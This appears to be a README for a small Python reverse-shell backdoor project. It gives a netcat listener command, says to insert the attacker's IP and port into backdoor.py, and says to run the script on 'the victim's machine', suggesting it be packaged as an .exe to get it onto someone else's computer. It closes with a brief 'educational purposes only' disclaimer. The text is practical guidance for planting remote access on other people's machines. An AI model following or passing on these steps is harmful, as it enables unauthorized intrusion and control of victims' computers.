# SIMPLE_BACKDOOR_PYTHON3
This is a very simple backdoor written for fun. It is written using Pthon3 and supports Cyrillic character recognition.


To use the backdoor, you need to start listening on some port on your device. To do this, use the command:

nc -vv -n -l -p *port number* #for Linux 

On line 13 of the backdoor.py file, insert the port number and your IP.
Afterwards, you need to run backdoor.py on the victimâ€™s machine. You can package the code into an .exe file, or come up with something else to make it more convenient for you to run the code on someone else's computer. But of course, I'm not advocating using this code for real attacks. Use it for educational purposes only.
